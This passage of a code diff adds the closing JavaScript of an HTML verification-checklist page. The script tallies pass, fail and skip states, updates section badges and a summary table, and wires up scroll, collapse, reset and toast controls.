+        else if (s === 'fail') fail++;
+        else if (s === 'skip') skip++;
+      });
+      $('#statTotal').textContent = all.length;
+      $('#statPass').textContent = pass;
+      $('#statFail').textContent = fail;
+      $('#statSkip').textContent = all.length - pass - fail - skip;
+      const pct = all.length > 0 ? ((pass + fail + skip) / all.length * 100) : 0;
+      $('#progressBar').style.width = pct + '%';
+    }
+
+    function updateSectionBadges() {
+      SECTIONS.forEach(section => {
+        const badge = $(`[data-badge="${section.id}"]`);
+        if (!badge) return;
+        const ids = [];
+        if (section.tests) section.tests.forEach(t => ids.push(t.id));
+        if (section.checklist) section.checklist.forEach(c => ids.push(c.id));
+        let passed = 0, failed = 0;
+        ids.forEach(id => {
+          if (state[id] === 'pass') passed++;
+          if (state[id] === 'fail') failed++;
+        });
+        badge.textContent = `${passed}/${ids.length}`;
+        badge.className = 'section-badge';
+        if (failed > 0) badge.classList.add('has-fail');
+        else if (passed === ids.length && ids.length > 0) badge.classList.add('all-pass');
+      });
+    }
+
+    /* ===========================================
+       SUMMARY TABLE
+       =========================================== */
+    function renderSummaryTable() {
+      const table = $('#summaryTable');
+      let html = `<thead><tr>
+        <th>#</th><th>Feature</th><th>Command</th><th>Expected</th><th>Status</th>
+      </tr></thead><tbody>`;
+      SUMMARY_ROWS.forEach(row => {
+        const s = getTestStatus(row.testId);
+        const dotClass = s === 'pass' ? 'pass' : s === 'fail' ? 'fail' : 'pending';
+        const label = s === 'pass' ? 'PASS' : s === 'fail' ? 'FAIL' : '—';
+        html += `<tr>
+          <td>${row.num}</td>
+          <td>${row.feature}</td>
+          <td class="cmd">${row.cmd}</td>
+          <td>${row.expected}</td>
+          <td><span class="result-dot ${dotClass}"></span> ${label}</td>
+        </tr>`;
+      });
+      html += `</tbody>`;
+      table.innerHTML = html;
+    }
+
+    function updateSummaryTable() { renderSummaryTable(); }
+
+    /* ===========================================
+       SCROLL ANIMATIONS
+       =========================================== */
+    function observeSections() {
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+            observer.unobserve(entry.target);
+          }
+        });
+      }, { threshold: 0.05, rootMargin: '0px 0px -30px 0px' });
+      $$('.section-card').forEach(card => observer.observe(card));
+    }
+
+    /* ===========================================
+       FABs
+       =========================================== */
+    $('#fabTop').onclick = () => window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    $('#fabCollapse').onclick = () => {
+      const cards = $$('.section-card');
+      const anyOpen = [...cards].some(c => c.classList.contains('open'));
+      cards.forEach(c => { anyOpen ? c.classList.remove('open') : c.classList.add('open'); });
+    };
+
+    $('#fabReset').onclick = () => {
+      if (confirm('Reset all verification status?')) {
+        state = {};
+        saveState();
+        render();
+        showToast('All status reset');
+      }
+    };
+
+    function showToast(msg) {
+      const t = $('#toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 2000);
+    }
+
+    /* ===========================================
+       INIT
+       =========================================== */
+    render();
+  </script>
+</body>
+</html>
